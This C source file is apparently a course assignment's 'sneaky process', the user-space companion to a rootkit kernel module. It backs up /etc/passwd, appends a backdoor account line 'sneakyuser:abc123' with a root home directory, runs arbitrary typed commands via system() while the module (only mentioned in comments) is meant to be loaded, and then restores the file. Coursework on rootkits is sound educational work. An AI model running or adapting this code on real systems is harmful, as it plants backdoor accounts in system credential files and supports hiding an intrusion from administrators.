/**
 * Author: Prathikshaa Rangarajan
 * Date: March 20, 2019
 * File Name: sneaky_processs.c
 * Description:
 *
 */

#define BUF_SIZE 2

#include <error.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

void run_command(const char *command, char *const args[]) {
  pid_t pid_fork, wait_res;
  int wstatus;

  pid_fork = fork();
  if (pid_fork == -1) {
    // fork error
    perror("fork error:");
  } else if (pid_fork == 0) {
    // child
    execv(command, args); // does not return on success
    perror("execv:");
  } else {
    // parent
    wait_res = waitpid(pid_fork, &wstatus, 0);
    if (wait_res == -1) {
      // error waiting for child
      perror("waitpid:");
    }
    return;
  }
}

void modify_passwd_file() {
  // copy /etc/passwd to /tmp/passwd
  char *const command[] = {"/bin/ls", "-l", 0}; // needs to be null terminated
  run_command(command[0], command);

  char *const cp_passwd_file[] = {"/bin/cp", "/etc/passwd", "/tmp/passwd", 0};
  run_command(cp_passwd_file[0], cp_passwd_file);
  printf("Copied /etc/passwd to /tmp/passwd");

  // add following line to end of tmp/passwd
  // sneakyuser:abc123:2000:2000:sneakyuser:/root:bash
  FILE *fp;

  fp = fopen("/etc/passwd", "a");
  if (fp == NULL) {
    perror("fopen passwd file");
    exit(EXIT_FAILURE);
  }

  fprintf(fp, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
  fclose(fp);

  printf("\nappended sneaky line to /etc/passwd\n\n");
}

void reset_passwd_file() {
  char *const test_open[] = {"/bin/cat", "/etc/passwd",
                             0}; // needs to be null terminated
  run_command(test_open[0], test_open);

  // cp /tmp/passwd to /etc/psswd
  char *const reset_passwd_file[] = {"/bin/cp", "/tmp/passwd", "/etc/passwd",
                                     0};
  run_command(reset_passwd_file[0], reset_passwd_file);
  printf("\nafter resetting /etc/passwd\n\n");
  run_command(test_open[0], test_open);
}

int main(void) {
  /*-------------------------------1------------------------------*/
  printf("sneaky_process pid = %d\n", getpid());
  /*-------------------------------2------------------------------*/
  modify_passwd_file();

  /*-------------------------------3------------------------------*/
  // load sneaky module using insmod()
  // pass pid to module
  // ref: http://www.tldp.org/LDP/lkmpg/2.6/html/x323.html

  /*-------------------------------4------------------------------*/
  // while(1)
  // take keyboard input until "q"-quit
  // execute the commands from user -- to test sneaky_mod

  /* int i = 10; */
  /* while (i > 0) { */
  /*   printf("Enter a command for testing\n"); */
  /*   size_t buf_size = BUF_SIZE; */
  /*   char buffer[buf_size]; */
  /*   memset(&buffer, 0, buf_size); */
  /*   char *b = buffer; */
  /*   ssize_t input_size; */

  /*   input_size = getline(&b, &buf_size, stdin); */
  /*   if (input_size == -1) { */
  /*     perror("getline"); */
  /*   } */
  /*   if (input_size == BUF_SIZE) { */
  /*     buffer[buf_size] = 0; */
  /*   } */
  /*   printf("Input String:\n%s\n", b); */
  /*   printf("input_size: %lu\n", input_size); */
  /*   i--; */
  /* } */

  char *curr = NULL;
  size_t len; // = BUF_SIZE;
  ssize_t read_len;

  printf("Enter commands to evaluate. Enter q to exit.\n");
  const char *quit = "q";
  int res = 0;
  while ((read_len = getline(&curr, &len, stdin)) != -1) {
    char *newline_ptr = strchr(curr, '\n');
    if (newline_ptr != NULL) {
      *newline_ptr = '\0';
    }
    //    printf("read line %s\n", curr);
    if ((res = strcmp(curr, quit)) == 0) {
      break;
    }
    system(curr);
    //    printf("%d\n", res);
    printf("Enter commands to evaluate. Enter q to exit.\n");
  }

  // test malicious behavior

  // end while
  /*-------------------------------5------------------------------*/
  // unload sneaky kernel module using rmmod()

  /*-------------------------------6------------------------------*/
  reset_passwd_file();

  return EXIT_SUCCESS;
}
